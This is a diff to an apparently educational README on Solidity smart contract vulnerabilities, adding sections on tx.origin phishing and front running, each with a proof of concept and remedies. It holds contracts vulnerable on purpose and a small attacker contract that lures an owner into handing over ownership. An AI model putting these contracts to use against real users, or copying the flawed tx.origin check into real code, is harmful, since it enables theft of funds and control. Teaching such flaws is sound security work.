@@ -13,6 +13,8 @@ Summary:
 -   [Denial of Service](#denial-of-service)
     -   [Reject Ether transfer](#reject-ether-transfer)
     -   [DoS with Block Gas Limit](#dos-with-block-gas-limit)
+-   [Phishing with tx.origin](#phishing-with-txorigin)
+-   [Front Running](#front-running)
 
 # Reentrancy
 
@@ -438,3 +440,104 @@ In the code of the PoC we can see that we don't have any revert in case the call
 ### Solutions:
 
 Same as with the previous DoS vulnerability, try avoiding making calls to unknown contract, but if you have to, implement the `Pull over Push` Smart Contract design pattern.
+
+# Phishing with tx.origin
+
+The `tx.origin` variable is used to get the address of the sender of the transaction which can only be a EOA(externally owned address). This variable is not the same as `msg.sender` which is the address of the EOA/contract that called the function. This can be used by an attacker to trick users into thinking that a transaction is coming from a trusted contract.
+
+### POC
+
+-   Contracts: [PhishingTxOrigin.sol](contracts/PhishingTxOrigin.sol)
+-   Test: `yarn test test/phishingTxOrigin.ts`
+
+In the PoC, the attacker contract will bait the owner of the vulnerable contract to call it's `winFreeMoney()` function and in the function logic will call the vulnerable contract's `transferOwnership()` function. The vulnerable contract won't care who called the function as long as the transaction was initiated by the owner of the contract, which is the case here, so the attacker will be able to take ownership of the vulnerable contract.
+
+```solidity
+contract PhishingTxOriginVulnerable {
+    address public owner;
+
+    constructor() {
+        owner = msg.sender;
+    }
+
+    function transferOwnership(address _newOwner) public {
+        require(tx.origin == owner, "Not owner");
+        owner = _newOwner;
+    }
+}
+
+contract PhishingTxOriginAttacker {
+    PhishingTxOriginVulnerable vulnerable;
+
+    constructor(PhishingTxOriginVulnerable _vulnerable) {
+        vulnerable = _vulnerable;
+    }
+
+    /////////////////////////////////////
+    // Call this function for free ETH //
+    /////////////////////////////////////
+    function winFreeMoney() public {
+        vulnerable.transferOwnership(address(this));
+    }
+}
+```
+
+### Solutions:
+
+Use `msg.sender` instead of `tx.origin` to check if the transaction was initiated by the owner of the contract. It's almost never recommended to use `tx.origin` in your Smart Contracts, besides maybe for logging purposes or in comparison with `msg.sender` to check if the transaction is directlly coming from an EOA or from a contract, like:
+
+```solidity
+if (tx.origin == msg.sender) {
+    // Transaction is coming from an EOA
+} else {
+    // Transaction is coming from a contract
+}
+```
+
+# Front Running
+
+Front running is one of the more diverse attacks in the Smart Contract space and can be used in many different ways. The general idea is that a malicious actor will try to get a transaction mined before a transaction that they know will be mined. This can be used to get a better price on a trade, to get a better price on a token sale, to get a better price on a bid, etc.
+
+The flow of a front running attack is as follows:
+
+1. The attacker monitors the mempool for transactions that they can front run to make a profit.
+2. A user sends a transaction to the transaction pool from which the miner will pick transactions to include in the next block.
+3. The attacker identifies the transaction that they want to front run and sends a transaction with a higher gas price to the transaction pool that can:
+    - Include the same logic as the transaction that they want to front run, with a higher gas price, so they can get the same result as the user, claiming the profit for themselves.
+    - Include logic that will make the transaction that they want to front run fail.
+    - Include logic that will make the transaction that they want to front run lose money and create a opportunity for the attacker to make a profit.
+4. Due to the higher gas price, the attacker's transaction will be picked by the miner to be included in the next block, instead of the user's transaction.
+5. The attacker's transaction is mined before the user's transaction, so the attacker can get the result that they want.
+
+### POC
+
+-   Contracts: [FrontRunning.sol](contracts/FrontRunning.sol)
+
+In the PoC, the attacker will monitor the mempool for transactions that call the vulnerable contract's `claimPrize()` function. When the attacker sees a transaction that calls the `claimPrize()` function with the corect password, they will send a transaction with a higher gas price that will call the vulnerable contract's `claimPrize()` function with the same parameter and transfer the funds to the attacker's address.
+
+```solidity
+contract FrontRunningVulnerable {
+    address public winner;
+    bytes32 public passwordHash;
+
+    // The deployer of the contract sets a password hash and some Ether to be claimed.
+    constructor(bytes32 _passwordHash) payable {
+        passwordHash = _passwordHash;
+    }
+
+    // The winner can claim their prize by providing the password as a string
+    // that has to be hashed to the password hash to verify it.
+    function claimPrize(string memory _password) public {
+        require(keccak256(abi.encodePacked(_password)) == passwordHash, "Wrong password");
+        winner = msg.sender;
+        (bool sc,) = msg.sender.call{value: address(this).balance}("");
+        require(sc, "Failed to send Ether");
+    }
+}
+```
+
+### Solutions:
+
+Front-running is a pervasive issue on public blockchains such as Ethereum. The best remediation is to remove the benefit of front-running in your application, mainly by removing the importance of transaction ordering or time. Another way is to use a pre-commit scheme (“I’m going to submit the details later”).
+
+Protocol-level solutions such as [Flashbots](https://docs.flashbots.net/flashbots-auction/searchers/advanced/rpc-endpoints/) or [Submarine Commits](https://libsubmarine.org/) are also being developed or user to mitigate the issue.
